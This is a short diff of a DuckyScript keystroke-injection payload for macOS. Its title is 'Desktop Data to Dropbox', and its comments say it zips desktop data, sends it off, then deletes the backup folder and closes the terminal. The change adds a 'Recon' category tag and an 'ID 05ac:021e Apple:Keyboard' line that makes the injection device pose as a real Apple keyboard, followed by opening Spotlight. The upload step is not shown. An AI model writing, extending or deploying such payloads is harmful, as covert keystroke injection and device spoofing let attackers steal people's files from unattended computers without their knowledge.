@@ -6,7 +6,10 @@ REM The Backup folder containing the .zip will be deleted and the terminal will 
 REM Author: Narsty
 REM Title: Desktop Data to Dropbox 
 REM Version 2.0 MacOs
+REM Category: Recon
 
+
+ID 05ac:021e Apple:Keyboard
 DELAY 500
 GUI SPACE
 DELAY 500
